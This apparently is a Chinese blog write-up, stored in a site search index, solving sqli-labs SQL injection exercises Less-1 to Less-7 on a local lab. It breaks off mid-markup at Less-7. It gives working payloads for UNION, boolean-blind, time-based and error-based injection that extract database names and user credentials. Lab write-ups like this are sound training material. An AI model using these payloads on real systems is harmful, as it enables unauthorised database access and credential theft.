<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqli-labs 刷题记录</title>
      <link href="/2022/05/17/sqli-labs/"/>
      <url>/2022/05/17/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-刷题记录"><a href="#sqli-labs-刷题记录" class="headerlink" title="sqli-labs 刷题记录"></a>sqli-labs 刷题记录</h1><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/lcamry/category/846064.html">MYSQL注入天书</a></p></blockquote><p>此文尽量使用手工注入以加深对原理的理解，竭力避免了使用sqlmap或者脚本自动化注入等方式。</p><h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1 (Basic Challenges)"></a>Page-1 (Basic Challenges)</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)</h3><h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><p>进去之后发现让输入id，随便输一个数字id发现都可以正常回显，然后尝试注入</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/M4r9ztPgwYUuNdL.png" alt="1_1.png"></p><p>根据报错信息猜测原语句是用<code>&#39;$id&#39;</code>来处理的输入，故用<code>&#39;</code>闭合即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/X1JuzWeRH5GcntV.png" alt="1_2.png"></p><p>正常回显，故用<code>order by</code>爆出列数，发现有3列(4时报错)</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">order</span> by <span class="number">4</span>--+</span><br></pre></td></tr></table></figure><p>然后开始爆库名</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/639kfQjuw8qMStc.png" alt="1_3.png"></p><p>发现<code>security</code>数据库，开始爆表名</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/YLH869CSsQAWbE5.png" alt="1_4.png"></p><p>爆<code>users</code>表里的列名</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/fbgWAv5Ir68DTdY.png" alt="1_5.png"></p><p>爆出表里的所有数据</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/Uc5l39PbvWEoXCG.png" alt="1_6.png"></p><p>很好，我们终于达到了和不断直接输入<code>?id=xxxxx</code>相同的效果hhh😄</p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>把传入的<code>$id</code>直接当作字符串拼接了进来，故只需要用<code>&#39;</code>闭合掉前面的引号，然后用<code>--+</code>注释掉后面的语句即可完成注入</p><h3 id="Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><h4 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h4><p>输入<code>?id=1&#39;</code>观察报错</p><p><img src="https://s2.loli.net/2022/05/17/6cSxRIwZXdgPE1r.png" alt="2.png"></p><p>根据报错猜测是未用<code>&#39;&#39;</code>包裹<code>$id</code>，直接对输入进行拼接，故与less-1相比只需去掉数字后的<code>&#39;</code>即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到直接把<code>$id</code>拼接了进来。</p><h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><h4 id="手动注入-2"><a href="#手动注入-2" class="headerlink" title="手动注入"></a>手动注入</h4><p>输入<code>?id=1&#39;</code>观察报错</p><p><img src="https://s2.loli.net/2022/05/17/SefyJM3Dud15Pk6.png" alt="3.png"></p><p>根据报错猜测原语句是<code>(&#39;$id&#39;)</code>，故只需用<code>&#39;)</code>来闭合即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)--+</span><br><span class="line"><span class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-4-GET-Error-based-Double-Quotes-String-基于错误的GET双引号字符型注入"><a href="#Less-4-GET-Error-based-Double-Quotes-String-基于错误的GET双引号字符型注入" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)"></a>Less-4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</h3><h4 id="手动注入-3"><a href="#手动注入-3" class="headerlink" title="手动注入"></a>手动注入</h4><p>还是输入<code>?id=1&#39;</code>，发现能正常显示，故使用<code>?id=1&quot;</code>进行尝试</p><p><img src="https://s2.loli.net/2022/05/17/b7qLRYUfVed6hnW.png" alt="4.png"></p><p>根据报错猜测原语句是<code>(&quot;$id&quot;)</code>，故只需用<code>&quot;)</code>来闭合即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)--+</span><br><span class="line"><span class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><h4 id="源码分析-4"><a href="#源码分析-4" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与less-1一样用<code>&#39;&#39;</code>对输入进行处理来拼接，不同的是输入正确后不在显示数据库信息，而报错信息却能正确回显，此处将使用多种方式完成注入，以通过此关来学习各种注入方法及函数利用。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h5 id="利用left-和length-函数获取版本号及库名"><a href="#利用left-和length-函数获取版本号及库名" class="headerlink" title="利用left()和length()函数获取版本号及库名"></a>利用left()和length()函数获取版本号及库名</h5><p>逐位进行字符对比，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆版本号，我的数据库版本是10.4.11-MariaDB</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> left(version(),<span class="number">1</span>)=<span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">2</span>)=<span class="number">10</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆库长</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and length(database())=<span class="number">8</span>--+</span><br><span class="line"><span class="comment">#爆库名，使用的数据库名称为security，先看第一位是不是大于a,然后逐位尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">1</span>)&gt;<span class="string">&#x27;a&#x27;</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">8</span>)=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><h5 id="利用substr-和ascii-函数获取表名"><a href="#利用substr-和ascii-函数获取表名" class="headerlink" title="利用substr()和ascii()函数获取表名"></a>利用substr()和ascii()函数获取表名</h5><p>逐位对比，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆表名，这里第一个表是emails，使用的数据库是security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">109</span>--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆出第一个字符后挨个爆破剩余字符，最后获取第一个表名，如果想获取第二个，只需要修改limit后的内容即可</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>--+</span><br></pre></td></tr></table></figure><h5 id="利用regexp-函数获取列名字"><a href="#利用regexp-函数获取列名字" class="headerlink" title="利用regexp()函数获取列名字"></a>利用regexp()函数获取列名字</h5><p>正则匹配，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#看users中是否有以us开头的列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br><span class="line"><span class="comment">#看users中是否有以pass开头的列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^pass[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure><h5 id="利用ord-和mid-函数获取users-表的内容"><a href="#利用ord-和mid-函数获取users-表的内容" class="headerlink" title="利用ord()和mid()函数获取users 表的内容"></a>利用ord()和mid()函数获取users 表的内容</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一个用户名为Dumb，此语句是看第一个用户名的第一个字符是否为D</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>--+</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote><p><a href="https://www.cnblogs.com/JxSir/articles/15183838.html">MySQL ERROR 1267 (HY000)错误解决办法</a></p></blockquote><h5 id="利用floor-rand-0-2-进行报错注入"><a href="#利用floor-rand-0-2-进行报错注入" class="headerlink" title="利用floor(rand(0)*2)进行报错注入"></a>利用floor(rand(0)*2)进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,count(*),concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand(<span class="number">0</span>)*<span class="number">2</span>))a from information_schema.columns  group by a--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/jVI2pOsYowrS3e9.png" alt="5_1.png"></p><h5 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a>利用 double 数值类型超出范围进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> (exp(~(<span class="literal">select</span> * FROM(SELECT USER())a))),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h5 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a>利用 bigint 溢出进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">union</span> <span class="literal">select</span> (!(<span class="literal">select</span> * from (<span class="literal">select</span> user())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h5 id="利用xpath-函数报错注入"><a href="#利用xpath-函数报错注入" class="headerlink" title="利用xpath 函数报错注入"></a>利用xpath 函数报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/k4lyGzREivtZDOj.png" alt="5_2.png"></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> updatexml(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/qBsh1nNgyuUOJk4.png" alt="5_3.png"></p><h5 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a>利用数据的重复性</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from (<span class="literal">select</span> NAME_CONST(version(),<span class="number">1</span>), NAME_CONST(version(),<span class="number">1</span>))x--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/OoRQ4mK8lukwNcq.png" alt="5_4.png"></p><h5 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;UNION SELECT (IF(SUBSTRING(current,<span class="number">1</span>,<span class="number">1</span>)=CHAR(<span class="number">115</span>),BENCHMARK(<span class="number">50000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),null)),<span class="number">2</span>,<span class="number">3</span> FROM (<span class="literal">select</span> database() as cur</span><br><span class="line">rent) as tb1--+</span><br></pre></td></tr></table></figure><h3 id="Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h3><h4 id="手动注入-4"><a href="#手动注入-4" class="headerlink" title="手动注入"></a>手动注入</h4><p>利用报错注入可以看到版本信息。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-6/?id=1&quot;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-5"><a href="#源码分析-5" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>&quot;&quot;</code>来处理<code>$id</code>，不回显正常输出的信息。</p><h3 id="Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h3><h4 id="源码分析-6"><a href="#源码分析-6" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看出是使用了<code>((&#39;&#39;))</code>来处理输入。</p><h4 id="手动注入-5"><a href="#手动注入-5" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span 